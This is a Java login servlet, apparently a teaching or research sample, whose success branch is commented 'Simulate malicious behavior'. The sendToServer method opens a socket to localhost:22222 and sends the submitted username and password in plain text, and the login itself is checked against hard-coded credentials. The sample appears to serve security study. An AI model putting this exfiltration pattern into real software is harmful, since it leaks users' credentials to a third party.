package de.tum.example;


import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * Servlet implementation class MyNewServlet
 */
@WebServlet(name = "MyNewServlet", urlPatterns = {"/MyNewServlet"})
public class MyNewServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    /**
     * @see HttpServlet#HttpServlet()
     */
    public MyNewServlet() {
        super();
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		//response.getWriter().append("Served at: ").append(request.getContextPath());
		response.setContentType("text/html");
		String username = request.getParameter("uname").toString();
		String password = request.getParameter("psw").toString();
		if ("myuser".equals(username) && "mypass".equals(password)) {
			response.getWriter().print("Correct");
			
			//Simulate malicious behavior
			sendToServer(username, password);
		} else {
			response.getWriter().print("Wrong credentials");
		}
		
	}
	
	private void sendToServer(String username, String password) {
		Socket socket=null;
		try
        {
            String host = "localhost";
            int port = 22222;
//            InetAddress address = InetAddress.getByName(host);
//            socket = new Socket(address, port);
            	
            SocketAddress socketAddress = new InetSocketAddress(host, port);
            socket = new Socket();
            socket.connect(socketAddress, 2000);
//            if (socket==null) {
//            	System.err.print("null");
//            }
//            	
            
            //Send the message to the server
            OutputStream os = socket.getOutputStream();
            OutputStreamWriter osw = new OutputStreamWriter(os);
            BufferedWriter bw = new BufferedWriter(osw);
 
            String sendMessage = username + " - " + password + "\n";
            bw.write(sendMessage);
            bw.flush();
        }
		catch (Exception e) {
			e.printStackTrace();
		}
        finally
        {
            //Closing the socket
            try
            {
                if (socket!=null) socket.close();
            }
            catch(Exception e)
            {
                e.printStackTrace();
            }
        }
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		doGet(request, response);
	}

}
